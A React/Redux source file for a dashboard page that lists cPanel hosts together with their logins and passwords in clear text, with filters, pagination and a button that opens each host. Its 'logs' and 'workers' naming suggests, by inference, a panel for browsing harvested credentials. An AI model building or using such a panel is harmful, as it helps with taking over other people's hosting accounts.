import React, { useEffect, useState } from 'react';
import ReactPaginate from 'react-paginate';

import languagesTranslate from '../../common/languages'

import { connect } from 'react-redux';
import { getOwnAllCpanels, changeAllCpanelsFilter } from '../../store/actions/logs.actions'

export default connect((s) => ({
  user: s.user.state,
  allCpanels: s.logs.cpanels,
}), {
  getOwnAllCpanels,
  changeAllCpanelsFilter
})(
  ({
    CurrentLanguage_G,

    user,
    allCpanels,

    getOwnAllCpanels,
    changeAllCpanelsFilter
  }) => {
    const [CurrentPage, changeCurrentPage] = useState(1)
    const [Cpanels, changeCpanels] = useState([])

    const handlePageChange = (page) => {

      changeCurrentPage(page);

      if (allCpanels.state.length != allCpanels.all && CurrentPage == (Cpanels.length / allCpanels.filter.ShowOnPage) - 1)
        getOwnAllCpanels({
          token: user.token,
          from: allCpanels.state.length
        })

    }

    useEffect(() => {
      let _allCpanels = [];

      for (let i = 0; i < allCpanels.state.length; i++)
        _allCpanels = [..._allCpanels, ...allCpanels.state[i].cpanels.map(v => ({ id: allCpanels.state[i].id, value: v }))]

      changeCpanels(_allCpanels)

    }, [allCpanels.state])

    useEffect(() => {
      getOwnAllCpanels({
        ...allCpanels.filter,
        token: user.token
      })
    }, [allCpanels.filter])

    return (
      <section className="content">
        <div className="body_scroll">
          <div className="block-header">
            <div className="row">
              <div className="col-lg-7 col-md-6 col-sm-12">
                <h2>{languagesTranslate[CurrentLanguage_G].allCpanelsPage.header}</h2>
                <ul className="breadcrumb">
                  <li className="breadcrumb-item"><a href="index.html"><i className="zmdi zmdi-home"></i> RiseTop</a>
                  </li>
                  <li className="breadcrumb-item">{languagesTranslate[CurrentLanguage_G].allCpanelsPage.pathItem1}</li>
                  <li className="breadcrumb-item active">{languagesTranslate[CurrentLanguage_G].allCpanelsPage.pathItem2}</li>
                </ul>
                <button className="btn btn-primary btn-icon mobile_menu" type="button"><i
                  className="zmdi zmdi-sort-amount-desc"></i></button>
              </div>
            </div>
          </div>

          <div class="container-fluid">
            <div class="row clearfix">
              <div class="col-lg-12 col-md-12">
                <div class="card">
                  <div class="header">
                    <h2><strong>{languagesTranslate[CurrentLanguage_G].allCpanelsPage.cpanels}</strong></h2>
                  </div>
                  <div class="body">
                    <div class="row mb-2">
                      <div class="col-lg-2 pr-1 col-md-4">
                        <div class="form-group">
                          <input type="text" class="form-control" placeholder={languagesTranslate[CurrentLanguage_G].allCpanelsPage.id} value={allCpanels.filter.id} onChange={e => changeAllCpanelsFilter({ name: 'id', value: e.target.value })} />
                        </div>
                      </div>
                      <div class="col-lg-3 pr-1 col-md-4">
                        <div class="form-group">
                          <input type="text" class="form-control" placeholder={languagesTranslate[CurrentLanguage_G].allCpanelsPage.host} value={allCpanels.filter.host} onChange={e => changeAllCpanelsFilter({ name: 'host', value: e.target.value })} />
                        </div>
                      </div>
                    </div>
                    <div className="row">
                      <div className="col-6">
                        <div className="w-100 h-100 d-flex align-items-center">
                          <span>{languagesTranslate[CurrentLanguage_G].allCpanelsPage.showText}</span>
                          <div class="form-group d-inline-block mr-1 ml-1 mb-0">
                            <select class="custom-select" value={allCpanels.filter.ShowOnPage} onChange={e => changeAllCpanelsFilter({ name: 'ShowOnPage', value: parseInt(e.target.value) })}>
                              <option value={'25'}>25</option>
                              <option value={'50'}>50</option>
                              <option value={'75'}>75</option>
                              <option value={'100'}>100</option>
                            </select>
                          </div>
                          <span>{languagesTranslate[CurrentLanguage_G].allCpanelsPage.results}</span>
                          <span className={'ml-2 text-muted'}>{languagesTranslate[CurrentLanguage_G].allCpanelsPage.show(((CurrentPage - 1) * allCpanels.filter.ShowOnPage) + 1, CurrentPage * allCpanels.filter.ShowOnPage, Cpanels.length)}</span>
                        </div>
                      </div>
                      <div className="col-6">
                        <ReactPaginate
                          previousLinkClassName={'btn btn-secondary previous'}
                          previousLabel={languagesTranslate[CurrentLanguage_G].WorkersLogsPage.previous}
                          nextLinkClassName={'btn btn-secondary next'}
                          nextLabel={languagesTranslate[CurrentLanguage_G].WorkersLogsPage.next}
                          breakLabel={'...'}
                          breakClassName={'break-me'}
                          pageCount={Math.ceil(25 / 25)}
                          marginPagesDisplayed={2}
                          pageRangeDisplayed={5}
                          onPageChange={(page) => handlePageChange(page.selected + 1)}
                          containerClassName={'pagination justify-content-end'}
                          activeClassName={'active'}
                          pageLinkClassName={'num'}
                        />
                      </div>
                    </div>
                    <table class="table table-bordered">
                      <thead>
                        <tr>
                          <th>{languagesTranslate[CurrentLanguage_G].allCpanelsPage.id}</th>
                          <th>{languagesTranslate[CurrentLanguage_G].allCpanelsPage.host}</th>
                          <th>{languagesTranslate[CurrentLanguage_G].allCpanelsPage.login}</th>
                          <th>{languagesTranslate[CurrentLanguage_G].allCpanelsPage.password}</th>
                          <th>{languagesTranslate[CurrentLanguage_G].allCpanelsPage.logIn}</th>
                        </tr>
                      </thead>
                      <tbody>
                        {
                          Cpanels.map((v, i) =>
                            i < CurrentPage * allCpanels.filter.ShowOnPage && i >= (CurrentPage - 1) * allCpanels.filter.ShowOnPage
                              ? <tr key={i}>
                                <td className={'text-center'}>
                                  {v.id}
                                </td >
                                <td className={'text-center'}>
                                  {v.value.host}
                                </td >
                                <td className={'text-center'}>
                                  {v.value.login}
                                </td >
                                <td className={'text-center'}>
                                  {v.value.password}
                                </td >
                                <td className={'text-center'}>
                                  <a href={v.value.host} target={"_blank"}>
                                    <button type="button" class="btn btn-primary mt-0 mb-0 h-100">
                                      <span class="btn-label">
                                        <i class="zmdi zmdi-sign-in"></i>
                                      </span>
                                    </button>
                                  </a>
                                </td >
                              </tr>
                              : null
                          )
                        }
                      </tbody>
                    </table>
                  </div>
                </div>
              </div>
            </div>
          </div>

        </div>
      </section >
    )

  }
);